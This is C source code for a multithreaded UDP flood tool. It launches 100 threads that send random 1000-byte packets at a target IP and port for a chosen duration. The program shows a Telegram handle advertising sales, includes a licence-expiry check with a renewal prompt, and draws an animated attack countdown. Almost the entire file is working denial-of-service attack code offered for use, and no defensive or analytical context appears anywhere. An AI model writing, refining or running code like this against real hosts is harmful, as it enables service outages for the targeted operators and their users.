#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <wchar.h>
#include <locale.h>
#include <fcntl.h>
#include <termios.h>
#include <signal.h>
#include <errno.h>

#define THREADS 100   // Threads (adjust for best performance)
#define BUFFER_SIZE 9999999     // Max UDP packet size for efficiency

#define EXPIRY_YEAR 2027
#define EXPIRY_MONTH 12
#define EXPIRY_DAY 15
#define EXPIRY_HOUR 12
#define EXPIRY_MINUTE 0
#define EXPIRY_SECOND 0

// ANSI color codes for crazy effects
static const char *colors[] = {
    "\033[1;31m", "\033[1;32m", "\033[1;33m", 
    "\033[1;34m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
};

// Characters for the crazy animation
static const wchar_t anim_chars[] = {L'█', L'▓', L'▒', L'░', L'*', L'!', L'#', L'$', L'%', L'&', L'@', L'?'};

// Structure to hold attack data
typedef struct attack_data {
    char target_ip[INET_ADDRSTRLEN];
    int target_port;
    int attack_duration;
    volatile int *stop_flag;  // Declare the pointer as volatile
} AttackData;

// Function to set socket options for better performance
void set_socket_options(int sock) {
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    int buffer_size = BUFFER_SIZE;  // Buffer size for sending
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
}

void *attack(void *arg) {
    AttackData *data = (AttackData *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Failed to create socket 😢");
        pthread_exit(NULL);
    }
    set_socket_options(sock);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->target_port);
    if (inet_pton(AF_INET, data->target_ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid IP address or not supported 🚫");
        close(sock);
        pthread_exit(NULL);
    }

    endtime = time(NULL) + data->attack_duration;
    char payload[1000];
    for (int i = 0; i < sizeof(payload) - 1; i++) {
        payload[i] = 'A' + (rand() % 26);
    }
    payload[sizeof(payload) - 1] = '\0';

    while (time(NULL) < endtime && !(*data->stop_flag)) {
        ssize_t sent = sendto(sock, payload, sizeof(payload), 0,
                              (const struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            usleep(100);  // Small sleep for resource efficiency
        } else if (sent < 0) {
            perror("Failed to send packet 🚀");
            break;
        }
    }
    close(sock);
    pthread_exit(NULL);
}

void *crazy_animation(void *arg) {
    int attack_duration = *(int *)arg;
    setlocale(LC_CTYPE, "");
    time_t endtime = time(NULL) + attack_duration;

    printf("*****************************************\n");
    printf("🔥 TELEGRAM CHANNEL: @LSR_RAJPUT 🔥\n");
    printf("💰 DM TO BUY : @LSR_RAJPUT 💰\n");
    printf("🛑 STOP ATTACK / NEW ATTACK PRESS: Q 🛑\n");
    printf("⏰ Expiry Date (IST): %02d-%02d-%04d %02d:%02d:%02d\n",
           EXPIRY_DAY, EXPIRY_MONTH, EXPIRY_YEAR, EXPIRY_HOUR, EXPIRY_MINUTE, EXPIRY_SECOND);
    printf("*****************************************\n");

    while (time(NULL) < endtime) {
        int time_left = (int)(endtime - time(NULL));
        int minutes = time_left / 60;
        int seconds = time_left % 60;

        printf("\r%s█▒▓░   Time Left: %02d:%02d %s\033[0m",
               colors[rand() % 7], minutes, seconds, colors[rand() % 7]);
        fflush(stdout);
        usleep(90000);  // Sleep for smoother animation
    }
    printf("\r%s🎉 Attack Completed! 🎉\033[0m\n", colors[0]);
    return NULL;
}

void set_nonblocking_mode() {
    struct termios term;
    tcgetattr(STDIN_FILENO, &term);
    term.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &term);
}

void *check_for_exit(void *arg) {
    volatile int *stop_flag = (volatile int *)arg;
    set_nonblocking_mode();
    while (1) {
        char c;
        if (read(STDIN_FILENO, &c, 1) == 1 && c == 'q') {
            *stop_flag = 1;
            kill(getpid(), SIGTERM);
            break;
        }
        usleep(100000); // Reduce CPU usage by adding a small delay
    }
    return NULL;
}

// Convert UTC to IST (Indian Standard Time)
void convert_utc_to_ist(struct tm *time_info) {
    time_info->tm_hour += 5;
    time_info->tm_min += 30;

    if (time_info->tm_min >= 60) {
        time_info->tm_min -= 60;
        time_info->tm_hour++;
    }
    if (time_info->tm_hour >= 24) {
        time_info->tm_hour -= 24;
        time_info->tm_mday++;
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("🔧 Usage: %s <target_ip> <target_port> <attack_duration> 🔧\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int attack_duration = atoi(argv[3]);

    struct tm expiry_time = {0};
    expiry_time.tm_year = EXPIRY_YEAR - 1900;
    expiry_time.tm_mon = EXPIRY_MONTH - 1;
    expiry_time.tm_mday = EXPIRY_DAY;
    expiry_time.tm_hour = EXPIRY_HOUR;
    expiry_time.tm_min = EXPIRY_MINUTE;
    expiry_time.tm_sec = EXPIRY_SECOND;

    convert_utc_to_ist(&expiry_time);

    time_t current_time_utc = time(NULL);  // Changed to standard time function
    time_t expiry_time_utc = mktime(&expiry_time);

    if (difftime(expiry_time_utc, current_time_utc) <= 0) {
        printf("🚫 This tool has expired. Please contact @LSR_RAJPUT for renewal. 🚫\n");
        return 1;
    }

    volatile int stop_flag = 0;

    // Using a fixed number of threads for simplicity and performance
    int threads = THREADS;
    pthread_t attack_threads[threads];
    AttackData data[threads];

    for (int i = 0; i < threads; i++) {
        strncpy(data[i].target_ip, target_ip, INET_ADDRSTRLEN - 1);
        data[i].target_ip[INET_ADDRSTRLEN - 1] = '\0';  // Ensure null-termination
        data[i].target_port = target_port;
        data[i].attack_duration = attack_duration;
        data[i].stop_flag = &stop_flag;

        if (pthread_create(&attack_threads[i], NULL, attack, (void *)&data[i]) != 0) {
            perror("Thread creation failed 😓");
            exit(1);
        }
    }

    pthread_t animation_thread;
    pthread_create(&animation_thread, NULL, crazy_animation, (void *)&attack_duration);

    pthread_t exit_thread;
    pthread_create(&exit_thread, NULL, check_for_exit, (void *)&stop_flag);

    for (int i = 0; i < threads; i++) {
        pthread_join(attack_threads[i], NULL);
    }

    pthread_join(animation_thread, NULL);
    pthread_join(exit_thread, NULL);

    printf("\n🎯 Attack completed. 🎯\n");
    return 0;
}
